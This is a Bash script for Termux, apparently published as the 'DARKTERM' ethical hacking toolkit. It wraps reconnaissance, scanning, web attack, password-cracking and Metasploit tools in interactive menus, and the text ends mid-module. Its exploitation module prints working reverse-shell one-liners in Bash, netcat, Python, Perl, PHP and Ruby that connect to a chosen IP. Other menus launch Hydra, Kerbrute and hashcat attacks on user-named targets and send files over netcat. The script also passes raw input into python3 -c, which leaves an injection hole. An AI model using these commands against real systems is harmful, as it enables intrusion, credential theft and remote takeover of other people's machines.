#!/data/data/com.termux/files/usr/bin/bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║                     D A R K T E R M                             ║
# ║              Advanced Ethical Hacking Framework                  ║
# ║                  For Authorized Testing Only                     ║
# ║                                                                  ║
# ║            Author : Alienkrishn [Anon4You]                       ║
# ║            GitHub : https://github.com/Anon4You                  ║
# ╚══════════════════════════════════════════════════════════════════╝

# Detect script location (works from any directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Data always lives in ~/darkterm regardless of where script is cloned
TOOLKIT_DIR="$HOME/darkterm"
LOG_DIR="$TOOLKIT_DIR/logs"
WORDLIST_DIR="$TOOLKIT_DIR/wordlists"
LOOT_DIR="$TOOLKIT_DIR/loot"

R='\033[1;31m' G='\033[1;32m' Y='\033[1;33m' B='\033[1;34m'
M='\033[1;35m' C='\033[1;36m' W='\033[1;37m' D='\033[0m'

# Wordlist package path
WL_DIR="$PREFIX/share/wordlists"

# Create data dirs if they don't exist
mkdir -p "$LOG_DIR" "$WORDLIST_DIR" "$LOOT_DIR"

# ═══════════════════════════════════════════════════════════════
#  WORDLIST RESOLVER: Pick from wordlists package or custom path
# ═══════════════════════════════════════════════════════════════
ensure_wordlists_pkg() {
    if [[ -d "$WL_DIR" ]] && [[ "$(ls "$WL_DIR" 2>/dev/null | wc -l)" -gt 0 ]]; then
        return 0
    fi
    echo -e "\n  ${R}[!] Wordlists package not installed${D}" >&2
    read -p "$(echo -e ${Y}  Install wordlists now? [y/N]: ${D})" yn >&2
    if [[ "$yn" == "y" || "$yn" == "Y" ]]; then
        echo -e "  ${G}[*] Installing wordlists...${D}" >&2
        apt install -y wordlists 2>&1 >&2
        return 0
    fi
    return 1
}

# Pick a wordlist from the wordlists package
# Usage: resolve_wl [optional_preselected_path]
resolve_wl() {
    # If user passed a valid path, use it directly
    if [[ -n "$1" && -f "$1" ]]; then
        echo "$1"
        return 0
    fi

    ensure_wordlists_pkg || return 1

    echo "" >&2
    echo -e "  ${C}Available wordlists:${D}" >&2
    echo "" >&2

    local -a wl_files=()
    local i=1
    while IFS= read -r f; do
        wl_files+=("$f")
        local name=$(basename "$f")
        local size=$(du -h "$f" 2>/dev/null | cut -f1)
        printf "    ${G}[%2d]${D}  %-45s %s\n" "$i" "$name" "$size" >&2
        ((i++))
    done < <(find "$WL_DIR" -maxdepth 1 -name "*.txt" -type f | sort)

    echo -e "    ${G}[ 0]${D}  Custom path" >&2
    echo "" >&2
    read -p "  Select wordlist [0-$((i-1))]: " sel >&2

    if [[ "$sel" == "0" ]]; then
        read -p "  Enter wordlist path: " custom_wl >&2
        if [[ -f "$custom_wl" ]]; then
            echo "$custom_wl"
            return 0
        else
            echo -e "  ${R}[!] File not found: $custom_wl${D}" >&2
            return 1
        fi
    elif [[ "$sel" -ge 1 && "$sel" -lt "$i" ]]; then
        echo "${wl_files[$((sel-1))]}"
        return 0
    else
        echo -e "  ${R}[!] Invalid selection${D}" >&2
        return 1
    fi
}

banner() {
    clear
    echo -e "${R}"
    cat << 'EOF'
    ██████╗  █████╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║  ██║███████║██████╔╝█████╔╝    ██║   █████╗  ██████╔╝██╔████╔██║
    ██║  ██║██╔══██║██╔══██╗██╔═██╗    ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║
    ██████╔╝██║  ██║██║  ██║██║  ██╗   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
EOF
    echo -e "${C}              ══════ ADVANCED ETHICAL HACKING TOOLKIT ══════${D}"
    echo -e "${Y}                   Authorized Testing Only | v2.0${D}"
    echo -e "${M}                    Author : Alienkrishn [Anon4You]${D}"
    echo -e "${D}                    Data   : $TOOLKIT_DIR${D}"
    echo ""
}

log_action() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_DIR/darkterm.log"
}

# ═══════════════════════════════════════════════════════════════
#  AUTO-INSTALL: Check if tool exists, prompt to install if missing
# ═══════════════════════════════════════════════════════════════
require_pkg() {
    local cmd="$1"
    local pkg="$2"

    if command -v "$cmd" &>/dev/null; then
        return 0
    fi

    echo -e "\n${R}[!] '$cmd' is not installed (package: $pkg)${D}"
    read -p "$(echo -e ${Y}  Install $pkg now? [y/N]: ${D})" yn
    if [[ "$yn" == "y" || "$yn" == "Y" ]]; then
        echo -e "${G}  [*] Installing $pkg...${D}"
        if apt install -y "$pkg" 2>&1; then
            echo -e "${G}  [+] $pkg installed successfully${D}"
            log_action "Auto-installed: $pkg"
            return 0
        else
            echo -e "${R}  [!] Failed to install $pkg${D}"
            return 1
        fi
    else
        echo -e "${Y}  [*] Skipping $pkg${D}"
        return 1
    fi
}

pause() {
    echo ""
    read -p "$(echo -e ${Y}  Press Enter to continue...${D})"
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 1: RECONNAISSANCE & OSINT
# ═══════════════════════════════════════════════════════════════
module_recon() {
    while true; do
        echo -e "\n  ${C}══════ RECONNAISSANCE & OSINT ══════${D}\n"
        echo -e "  ${G}[ 1]${D}  theHarvester       - Email/subdomain enumeration"
        echo -e "  ${G}[ 2]${D}  Amass              - DNS enumeration & attack"
        echo -e "  ${G}[ 3]${D}  Subfinder          - Passive subdomain discovery"
        echo -e "  ${G}[ 4]${D}  Whois Lookup       - Domain registration info"
        echo -e "  ${G}[ 5]${D}  DNSx               - DNS toolkit"
        echo -e "  ${G}[ 6]${D}  DNSmap             - DNS brute force mapper"
        echo -e "  ${G}[ 7]${D}  Waybackurls        - Historical URL discovery"
        echo -e "  ${G}[ 8]${D}  CeWL               - Custom wordlist from website"
        echo -e "  ${G}[ 9]${D}  HTTrack            - Website mirror/cloner"
        echo -e "  ${G}[10]${D}  Katana             - Web crawler"
        echo -e "  ${G}[ 0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}recon${D}\\$ ) " choice

        case $choice in
            1)
                require_pkg theharvester theharvester || { pause; continue; }
                read -p "  Target domain: " domain
                read -p "  Source (all/google/bing/linkedin): " source
                log_action "theHarvester: $domain source=$source"
                theharvester -d "$domain" -b "${source:-all}" 2>&1 | tee "$LOOT_DIR/harvester_${domain}_$(date +%s).txt"
                ;;
            2)
                require_pkg amass amass || { pause; continue; }
                read -p "  Target domain: " domain
                read -p "  Mode (enum/intel/track/viz): " mode
                log_action "Amass: $domain mode=$mode"
                amass "${mode:-enum}" -d "$domain" 2>&1 | tee "$LOOT_DIR/amass_${domain}_$(date +%s).txt"
                ;;
            3)
                require_pkg subfinder subfinder || { pause; continue; }
                read -p "  Target domain: " domain
                log_action "Subfinder: $domain"
                subfinder -d "$domain" -all 2>&1 | tee "$LOOT_DIR/subfinder_${domain}_$(date +%s).txt"
                ;;
            4)
                read -p "  Target domain/IP: " target
                log_action "Whois: $target"
                whois "$target" 2>&1 | tee "$LOOT_DIR/whois_${target}_$(date +%s).txt"
                ;;
            5)
                require_pkg dnsx dnsx || { pause; continue; }
                read -p "  Target domain: " domain
                read -p "  Record type (a/aaaa/cname/mx/ns/soa/txt): " rtype
                log_action "DNSx: $domain type=${rtype:-a}"
                echo "$domain" | dnsx -${rtype:-a} -resp 2>&1 | tee "$LOOT_DIR/dnsx_${domain}_$(date +%s).txt"
                ;;
            6)
                require_pkg dnsmap dnsmap || { pause; continue; }
                read -p "  Target domain: " domain
                log_action "DNSmap: $domain"
                dnsmap "$domain" 2>&1 | tee "$LOOT_DIR/dnsmap_${domain}_$(date +%s).txt"
                ;;
            7)
                require_pkg waybackurls waybackurls || { pause; continue; }
                read -p "  Target domain: " domain
                log_action "Waybackurls: $domain"
                echo "$domain" | waybackurls 2>&1 | tee "$LOOT_DIR/wayback_${domain}_$(date +%s).txt"
                ;;
            8)
                require_pkg cewl cewl || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Word depth (default 2): " depth
                log_action "CeWL: $url depth=$depth"
                cewl -d "${depth:-2}" -m 5 "$url" -w "$WORDLIST_DIR/cewl_$(date +%s).txt" 2>&1
                echo -e "  ${G}[+] Wordlist saved to $WORDLIST_DIR/${D}"
                ;;
            9)
                require_pkg httrack httrack || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Output directory: " outdir
                log_action "HTTrack: $url -> $outdir"
                httrack "$url" -O "$outdir" 2>&1
                ;;
            10)
                require_pkg katana katana || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Depth (default 3): " depth
                log_action "Katana: $url depth=$depth"
                katana -u "$url" -d "${depth:-3}" -jc 2>&1 | tee "$LOOT_DIR/katana_$(date +%s).txt"
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 2: NETWORK SCANNING & ENUMERATION
# ═══════════════════════════════════════════════════════════════
module_network() {
    while true; do
        echo -e "\n  ${C}══════ NETWORK SCANNING & ENUMERATION ══════${D}\n"
        echo -e "  ${G}[1]${D}  Nmap              - Network scanner"
        echo -e "  ${G}[2]${D}  fscan             - Fast network scanner"
        echo -e "  ${G}[3]${D}  Netcat            - Network utility (connect/listen/scan)"
        echo -e "  ${G}[4]${D}  HTTPing           - HTTP connectivity tester"
        echo -e "  ${G}[5]${D}  gping             - Visual ping"
        echo -e "  ${G}[6]${D}  2ping             - Bi-directional ping"
        echo -e "  ${G}[7]${D}  Traceroute        - Route tracing"
        echo -e "  ${G}[8]${D}  ARP Scan          - Local network discovery"
        echo -e "  ${G}[9]${D}  Port Sweep        - Quick port scan (bash builtin)"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}network${D}\\$ ) " choice

        case $choice in
            1)
                require_pkg nmap nmap || { pause; continue; }
                echo ""
                echo -e "  ${C}Scan Types:${D}"
                echo -e "    [1] Quick              (-T4 -F)"
                echo -e "    [2] Full               (-T4 -A -v)"
                echo -e "    [3] Service Version    (-sV)"
                echo -e "    [4] UDP                (-sU --top-ports 100)"
                echo -e "    [5] Vuln Scripts       (--script vuln)"
                echo -e "    [6] Custom"
                read -p "  Scan type: " stype
                read -p "  Target (IP/CIDR/hostname): " target
                case $stype in
                    1) scan_args="-T4 -F" ;;
                    2) scan_args="-T4 -A -v" ;;
                    3) scan_args="-sV -T4" ;;
                    4) scan_args="-sU --top-ports 100" ;;
                    5) scan_args="--script vuln -sV" ;;
                    6) read -p "  Custom args: " scan_args ;;
                    *) scan_args="-T4 -F" ;;
                esac
                log_action "Nmap: $target $scan_args"
                nmap $scan_args "$target" 2>&1 | tee "$LOOT_DIR/nmap_${target//\//_}_$(date +%s).txt"
                ;;
            2)
                require_pkg fscan fscan || { pause; continue; }
                read -p "  Target (IP/CIDR): " target
                log_action "fscan: $target"
                fscan -h "$target" 2>&1 | tee "$LOOT_DIR/fscan_${target//\//_}_$(date +%s).txt"
                ;;
            3)
                require_pkg nc netcat-openbsd || { pause; continue; }
                echo ""
                echo -e "  ${C}Netcat Modes:${D}"
                echo -e "    [1] Connect to host"
                echo -e "    [2] Listen on port"
                echo -e "    [3] Port scan"
                echo -e "    [4] File receive"
                echo -e "    [5] File send"
                read -p "  Mode: " nmode
                case $nmode in
                    1) read -p "  Host: " host; read -p "  Port: " port
                       log_action "NC connect: $host:$port"
                       nc -v "$host" "$port" ;;
                    2) read -p "  Port: " port
                       log_action "NC listen: $port"
                       nc -lvnp "$port" ;;
                    3) read -p "  Host: " host; read -p "  Port range (e.g. 1-1000): " pr
                       log_action "NC scan: $host $pr"
                       nc -zv "$host" $pr 2>&1 ;;
                    4) read -p "  Port: " port; read -p "  Output file: " outfile
                       log_action "NC receive: port=$port -> $outfile"
                       nc -lvnp "$port" > "$outfile" ;;
                    5) read -p "  Host: " host; read -p "  Port: " port; read -p "  File: " infile
                       log_action "NC send: $infile -> $host:$port"
                       nc -v "$host" "$port" < "$infile" ;;
                esac
                ;;
            4)
                require_pkg httping httping || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Count (default 5): " count
                log_action "HTTPing: $url"
                httping -c "${count:-5}" "$url" 2>&1
                ;;
            5)
                require_pkg gping gping || { pause; continue; }
                read -p "  Target host: " host
                log_action "gping: $host"
                gping "$host" 2>&1
                ;;
            6)
                require_pkg 2ping 2ping || { pause; continue; }
                read -p "  Target host: " host
                log_action "2ping: $host"
                2ping -c 5 "$host" 2>&1
                ;;
            7)
                read -p "  Target host: " host
                log_action "Traceroute: $host"
                traceroute "$host" 2>&1
                ;;
            8)
                require_pkg nmap nmap || { pause; continue; }
                read -p "  Subnet (e.g. 192.168.1.0/24): " subnet
                log_action "ARP scan: $subnet"
                nmap -sn -PR "$subnet" 2>&1 | tee "$LOOT_DIR/arp_scan_$(date +%s).txt"
                ;;
            9)
                read -p "  Target host: " host
                read -p "  Port range (e.g. 1-1000): " prange
                log_action "Port sweep: $host $prange"
                start=$(echo "$prange" | cut -d- -f1)
                end=$(echo "$prange" | cut -d- -f2)
                for port in $(seq "$start" "$end"); do
                    (echo >/dev/tcp/"$host"/"$port") 2>/dev/null && echo -e "  ${G}Port $port OPEN${D}" &
                done
                wait 2>/dev/null
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 3: WEB APPLICATION TESTING
# ═══════════════════════════════════════════════════════════════
module_web() {
    while true; do
        echo -e "\n  ${C}══════ WEB APPLICATION TESTING ══════${D}\n"
        echo -e "  ${G}[ 1]${D}  Nikto             - Web server scanner"
        echo -e "  ${G}[ 2]${D}  SQLmap            - SQL injection tool"
        echo -e "  ${G}[ 3]${D}  Nuclei            - Vulnerability scanner"
        echo -e "  ${G}[ 4]${D}  HTTPx             - HTTP toolkit"
        echo -e "  ${G}[ 5]${D}  Gobuster          - Directory/DNS bruter"
        echo -e "  ${G}[ 6]${D}  FFUF              - Web fuzzer"
        echo -e "  ${G}[ 7]${D}  Dirb              - Directory bruter"
        echo -e "  ${G}[ 8]${D}  WAFw00f           - WAF detector"
        echo -e "  ${G}[ 9]${D}  WPScan            - WordPress scanner"
        echo -e "  ${G}[ 0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}web${D}\\$ ) " choice

        case $choice in
            1)
                require_pkg nikto nikto || { pause; continue; }
                read -p "  Target URL: " url
                log_action "Nikto: $url"
                nikto -h "$url" 2>&1 | tee "$LOOT_DIR/nikto_$(date +%s).txt"
                ;;
            2)
                require_pkg sqlmap sqlmap || { pause; continue; }
                read -p "  Target URL (with param): " url
                read -p "  Extra args (--dbs/--tables/etc): " extra
                log_action "SQLmap: $url $extra"
                sqlmap -u "$url" --batch $extra 2>&1 | tee "$LOOT_DIR/sqlmap_$(date +%s).txt"
                ;;
            3)
                require_pkg nuclei nuclei || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Severity (low/medium/high/critical/all): " sev
                log_action "Nuclei: $url severity=${sev:-all}"
                nuclei -u "$url" -severity "${sev:-all}" 2>&1 | tee "$LOOT_DIR/nuclei_$(date +%s).txt"
                ;;
            4)
                require_pkg httpx httpx || { pause; continue; }
                read -p "  Target (URL or file of URLs): " target
                log_action "HTTPx: $target"
                if [[ -f "$target" ]]; then
                    httpx -l "$target" -status-code -title -tech-detect 2>&1 | tee "$LOOT_DIR/httpx_$(date +%s).txt"
                else
                    echo "$target" | httpx -status-code -title -tech-detect 2>&1 | tee "$LOOT_DIR/httpx_$(date +%s).txt"
                fi
                ;;
            5)
                require_pkg gobuster gobuster || { pause; continue; }
                echo ""
                echo -e "  ${C}Gobuster Modes:${D}"
                echo -e "    [1] Directory"
                echo -e "    [2] DNS"
                echo -e "    [3] VHost"
                read -p "  Mode: " gmode
                read -p "  Target URL/domain: " target
                read -p "  Wordlist (Enter for default): " wl
                wl="${wl:-$(resolve_wl)}"
                [[ -z "$wl" || ! -f "$wl" ]] && { pause; continue; }
                case $gmode in
                    1) log_action "Gobuster dir: $target"
                       gobuster dir -u "$target" -w "$wl" -t 50 2>&1 | tee "$LOOT_DIR/gobuster_$(date +%s).txt" ;;
                    2) log_action "Gobuster dns: $target"
                       gobuster dns -d "$target" -w "$wl" 2>&1 | tee "$LOOT_DIR/gobuster_dns_$(date +%s).txt" ;;
                    3) log_action "Gobuster vhost: $target"
                       gobuster vhost -u "$target" -w "$wl" 2>&1 | tee "$LOOT_DIR/gobuster_vhost_$(date +%s).txt" ;;
                esac
                ;;
            6)
                require_pkg ffuf ffuf || { pause; continue; }
                read -p "  Target URL (use FUZZ keyword): " url
                read -p "  Wordlist (Enter for default): " wl
                wl="${wl:-$(resolve_wl)}"
                [[ -z "$wl" || ! -f "$wl" ]] && { pause; continue; }
                log_action "FFUF: $url"
                ffuf -u "$url" -w "$wl" -mc 200,301,302,403 2>&1 | tee "$LOOT_DIR/ffuf_$(date +%s).txt"
                ;;
            7)
                require_pkg dirb dirb || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Wordlist (Enter for default): " wl
                wl="${wl:-$(resolve_wl)}"
                [[ -z "$wl" || ! -f "$wl" ]] && { pause; continue; }
                log_action "Dirb: $url"
                dirb "$url" "$wl" 2>&1 | tee "$LOOT_DIR/dirb_$(date +%s).txt"
                ;;
            8)
                require_pkg wafw00f wafw00f || { pause; continue; }
                read -p "  Target URL: " url
                log_action "WAFw00f: $url"
                wafw00f "$url" 2>&1 | tee "$LOOT_DIR/wafw00f_$(date +%s).txt"
                ;;
            9)
                require_pkg wpscan wpscan || { pause; continue; }
                read -p "  Target URL: " url
                read -p "  Extra args (--enumerate u/v/p): " extra
                log_action "WPScan: $url $extra"
                wpscan --url "$url" --random-user-agent $extra 2>&1 | tee "$LOOT_DIR/wpscan_$(date +%s).txt"
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 4: PASSWORD ATTACKS & CRACKING
# ═══════════════════════════════════════════════════════════════
module_password() {
    while true; do
        echo -e "\n  ${C}══════ PASSWORD ATTACKS & CRACKING ══════${D}\n"
        echo -e "  ${G}[1]${D}  John the Ripper   - Password cracker"
        echo -e "  ${G}[2]${D}  Hashcat           - Advanced password cracker"
        echo -e "  ${G}[3]${D}  Hydra             - Network login cracker"
        echo -e "  ${G}[4]${D}  BruteSpray        - Service brute force"
        echo -e "  ${G}[5]${D}  CUPP              - Common User Password Profiler"
        echo -e "  ${G}[6]${D}  Hashid            - Hash identifier"
        echo -e "  ${G}[7]${D}  PDFCracker        - PDF password cracker"
        echo -e "  ${G}[8]${D}  Kerbrute          - Kerberos brute force"
        echo -e "  ${G}[9]${D}  OpenSSL Hash      - Hash/crack with OpenSSL"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}password${D}\\$ ) " choice

        case $choice in
            1)
                require_pkg john john || { pause; continue; }
                read -p "  Hash file: " hashfile
                read -p "  Wordlist (Enter for rockyou): " wl
                wl="${wl:-$(resolve_wl)}"
                [[ -z "$wl" || ! -f "$wl" ]] && { pause; continue; }
                log_action "John: $hashfile"
                john --wordlist="$wl" "$hashfile" 2>&1 | tee "$LOOT_DIR/john_$(date +%s).txt"
                echo -e "  ${G}[+] Show results: john --show $hashfile${D}"
                ;;
            2)
                require_pkg hashcat hashcat || { pause; continue; }
                read -p "  Hash file: " hashfile
                read -p "  Hash mode (0=MD5, 1000=NTLM, 1800=SHA512crypt): " mode
                read -p "  Wordlist (Enter for rockyou): " wl
                wl="${wl:-$(resolve_wl)}"
                [[ -z "$wl" || ! -f "$wl" ]] && { pause; continue; }
                log_action "Hashcat: $hashfile mode=$mode"
                hashcat -m "${mode:-0}" -a 0 "$hashfile" "$wl" 2>&1 | tee "$LOOT_DIR/hashcat_$(date +%s).txt"
                ;;
            3)
                require_pkg thc-hydra thc-hydra || { pause; continue; }
                read -p "  Target host: " host
                read -p "  Service (ssh/ftp/http-get/etc): " service
                read -p "  Username (or file path): " user
                read -p "  Password list: " passlist
                read -p "  Port (Enter for default): " port
                log_action "Hydra: $host $service user=$user"
                local port_flag=""
                [[ -n "$port" ]] && port_flag="-s $port"
                if [[ -f "$user" ]]; then
                    hydra -L "$user" -P "$passlist" $port_flag "$host" "$service" -t 4 -vV 2>&1 | tee "$LOOT_DIR/hydra_$(date +%s).txt"
                else
                    hydra -l "$user" -P "$passlist" $port_flag "$host" "$service" -t 4 -vV 2>&1 | tee "$LOOT_DIR/hydra_$(date +%s).txt"
                fi
                ;;
            4)
                require_pkg brutespray brutespray || { pause; continue; }
                read -p "  Nmap output file (grepable format): " nmapfile
                read -p "  Password list: " passlist
                log_action "BruteSpray: $nmapfile"
                brutespray -f "$nmapfile" -P "$passlist" 2>&1 | tee "$LOOT_DIR/brutespray_$(date +%s).txt"
                ;;
            5)
                require_pkg cupp cupp || { pause; continue; }
                log_action "CUPP interactive mode"
                cupp -i 2>&1
                ;;
            6)
                require_pkg hashid hashid || { pause; continue; }
                read -p "  Hash value: " hash
                log_action "Hashid: $hash"
                hashid "$hash" 2>&1
                ;;
            7)
                require_pkg pdfcracker pdfcracker || { pause; continue; }
                read -p "  PDF file: " pdffile
                read -p "  Wordlist: " wl
                log_action "PDFCracker: $pdffile"
                pdfcracker "$pdffile" "$wl" 2>&1 | tee "$LOOT_DIR/pdfcracker_$(date +%s).txt"
                ;;
            8)
                require_pkg kerbrute kerbrute || { pause; continue; }
                read -p "  Domain: " domain
                read -p "  Domain controller IP: " dc
                read -p "  Username list: " userlist
                read -p "  Mode (userenum/passwordspray/bruteuser): " kmode
                log_action "Kerbrute: $domain $kmode"
                kerbrute "${kmode:-userenum}" --dc "$dc" -d "$domain" "$userlist" 2>&1 | tee "$LOOT_DIR/kerbrute_$(date +%s).txt"
                ;;
            9)
                read -p "  Hash type (md5/sha1/sha256/sha512): " htype
                read -p "  String to hash: " str
                log_action "OpenSSL hash: $htype"
                echo -n "$str" | openssl dgst "-$htype" 2>&1
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 5: EXPLOITATION & POST-EXPLOITATION
# ═══════════════════════════════════════════════════════════════
module_exploit() {
    while true; do
        echo -e "\n  ${C}══════ EXPLOITATION & POST-EXPLOITATION ══════${D}\n"
        echo -e "  ${G}[1]${D}  Metasploit        - Exploitation framework"
        echo -e "  ${G}[2]${D}  SearchSploit      - Exploit-DB search"
        echo -e "  ${G}[3]${D}  Netcat Shell      - Reverse/bind shell listener"
        echo -e "  ${G}[4]${D}  SSH Tunnel        - Port forwarding"
        echo -e "  ${G}[5]${D}  ProxyChains       - Route traffic through proxies"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}exploit${D}\\$ ) " choice

        case $choice in
            1)
                require_pkg msfconsole metasploit-framework || { pause; continue; }
                log_action "Metasploit launched"
                msfconsole 2>&1
                ;;
            2)
                if command -v searchsploit &>/dev/null; then
                    read -p "  Search term: " term
                    log_action "SearchSploit: $term"
                    searchsploit "$term" 2>&1 | tee "$LOOT_DIR/searchsploit_$(date +%s).txt"
                else
                    require_pkg msfconsole metasploit-framework || { pause; continue; }
                    read -p "  Search term: " term
                    log_action "SearchSploit (msf): $term"
                    msfconsole -q -x "search $term; exit" 2>&1
                fi
                ;;
            3)
                require_pkg nc netcat-openbsd || { pause; continue; }
                echo ""
                echo -e "  ${C}Netcat Shell:${D}"
                echo -e "    [1] Listen for reverse shell"
                echo -e "    [2] Generate reverse shell payloads"
                read -p "  Type: " stype
                case $stype in
                    1)
                        read -p "  Listen port: " port
                        log_action "NC reverse listener: $port"
                        echo -e "  ${G}[*] Listening on port $port...${D}"
                        nc -lvnp "$port" 2>&1
                        ;;
                    2)
                        read -p "  Your IP: " ip
                        read -p "  Your port: " port
                        log_action "Shell payloads: $ip:$port"
                        echo -e "\n  ${C}=== Reverse Shell Payloads ===${D}"
                        echo -e "  ${G}Bash:${D}     bash -i >& /dev/tcp/$ip/$port 0>&1"
                        echo -e "  ${G}Netcat:${D}   nc -e /bin/sh $ip $port"
                        echo -e "  ${G}Python:${D}   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
                        echo -e "  ${G}Perl:${D}     perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                        echo -e "  ${G}PHP:${D}      php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                        echo -e "  ${G}Ruby:${D}     ruby -e 'require \"socket\";TCPSocket.open(\"$ip\",$port){|s|exec \"/bin/sh\"}'"
                        ;;
                esac
                ;;
            4)
                require_pkg ssh openssh || { pause; continue; }
                echo ""
                echo -e "  ${C}SSH Tunnel:${D}"
                echo -e "    [1] Local forward  (-L)"
                echo -e "    [2] Remote forward (-R)"
                echo -e "    [3] SOCKS proxy    (-D)"
                read -p "  Type: " ttype
                read -p "  SSH user@host: " sshhost
                case $ttype in
                    1) read -p "  LocalPort:RemoteHost:RemotePort: " fwd
                       ssh -L "$fwd" -N "$sshhost" 2>&1 ;;
                    2) read -p "  RemotePort:LocalHost:LocalPort: " fwd
                       ssh -R "$fwd" -N "$sshhost" 2>&1 ;;
                    3) read -p "  SOCKS port: " sport
                       ssh -D "$sport" -N "$sshhost" 2>&1 ;;
                esac
                ;;
            5)
                require_pkg proxychains4 proxychains-ng || { pause; continue; }
                read -p "  Command to run through proxychains: " cmd
                log_action "ProxyChains: $cmd"
                proxychains4 $cmd 2>&1
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 6: CRYPTOGRAPHY & ENCODING
# ═══════════════════════════════════════════════════════════════
module_crypto() {
    while true; do
        echo -e "\n  ${C}══════ CRYPTOGRAPHY & ENCODING ══════${D}\n"
        echo -e "  ${G}[1]${D}  OpenSSL           - Encryption/hashing/key gen"
        echo -e "  ${G}[2]${D}  Python Crypto     - Advanced crypto operations"
        echo -e "  ${G}[3]${D}  GPG               - File/email encryption"
        echo -e "  ${G}[4]${D}  Base64/Hex/URL    - Encoding/decoding"
        echo -e "  ${G}[5]${D}  Hash Generator    - Multi-algorithm hasher"
        echo -e "  ${G}[6]${D}  SSL/TLS Analyzer  - Certificate checker"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}crypto${D}\\$ ) " choice

        case $choice in
            1)
                echo ""
                echo -e "  ${C}OpenSSL Operations:${D}"
                echo -e "    [1] RSA key pair"
                echo -e "    [2] Self-signed cert"
                echo -e "    [3] Hash file"
                echo -e "    [4] Encrypt/decrypt file"
                echo -e "    [5] Base64 encode/decode"
                echo -e "    [6] Random password"
                read -p "  Operation: " op
                case $op in
                    1) read -p "  Key size (default 4096): " bits
                       openssl genrsa -out "$LOOT_DIR/private_key.pem" "${bits:-4096}" 2>&1
                       openssl rsa -in "$LOOT_DIR/private_key.pem" -pubout -out "$LOOT_DIR/public_key.pem" 2>&1
                       echo -e "  ${G}[+] Keys saved to $LOOT_DIR/${D}" ;;
                    2) read -p "  Days valid (default 365): " days
                       openssl req -x509 -newkey rsa:4096 -keyout "$LOOT_DIR/key.pem" -out "$LOOT_DIR/cert.pem" -days "${days:-365}" -nodes 2>&1
                       echo -e "  ${G}[+] Cert saved to $LOOT_DIR/${D}" ;;
                    3) read -p "  File: " file; read -p "  Algorithm (md5/sha1/sha256/sha512): " algo
                       openssl dgst "-$algo" "$file" 2>&1 ;;
                    4) read -p "  [E]ncrypt or [D]ecrypt: " ed
                       read -p "  Input file: " infile; read -p "  Output file: " outfile
                       if [[ "$ed" == "E" || "$ed" == "e" ]]; then
                           openssl enc -aes-256-cbc -salt -in "$infile" -out "$outfile" 2>&1
                       else
                           openssl enc -aes-256-cbc -d -in "$infile" -out "$outfile" 2>&1
                       fi ;;
                    5) read -p "  [E]ncode or [D]ecode: " ed; read -p "  String: " str
                       if [[ "$ed" == "E" || "$ed" == "e" ]]; then echo -n "$str" | base64
                       else echo "$str" | base64 -d; fi ;;
                    6) read -p "  Length (default 32): " len
                       openssl rand -base64 "${len:-32}" 2>&1 ;;
                esac
                ;;
            2)
                require_pkg python3 python || { pause; continue; }
                read -p "  Operation (hash/encrypt): " op
                case $op in
                    hash)
                        read -p "  Algorithm (sha256/sha512/md5): " algo
                        read -p "  String: " str
                        python3 -c "from hashlib import $algo; print($algo(b'$str').hexdigest())" 2>&1 ;;
                    encrypt)
                        read -p "  String: " str; read -p "  Key (16/24/32 chars): " key
                        python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode
cipher = AES.new(b'$key', AES.MODE_CBC)
ct = cipher.encrypt(pad(b'$str', AES.block_size))
print('IV:', b64encode(cipher.iv).decode())
print('CT:', b64encode(ct).decode())
" 2>&1 ;;
                esac
                ;;
            3)
                echo ""
